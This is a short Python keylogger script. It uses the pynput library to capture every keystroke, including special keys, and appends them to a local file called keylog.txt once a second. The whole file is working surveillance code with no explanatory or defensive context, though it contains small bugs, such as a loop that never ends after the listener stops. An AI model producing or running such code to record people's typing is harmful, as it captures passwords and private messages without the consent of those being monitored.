import pynput.keyboard
import time

logged_keys = []

def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        logged_keys.append(str(key))

def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            if key == 'Key.enter':
                f.write('\n')
            elif key == 'Key.space':
                f.write(' ')
            elif key.startswith('Key.'):
                f.write(f'[{key}]')
            else:
                f.write(key)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

def main():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while True:
            if logged_keys:
                write_to_file(logged_keys.copy())
                logged_keys.clear()
            time.sleep(1)  # avoid high CPU usage

if __name__ == "__main__":
    main()
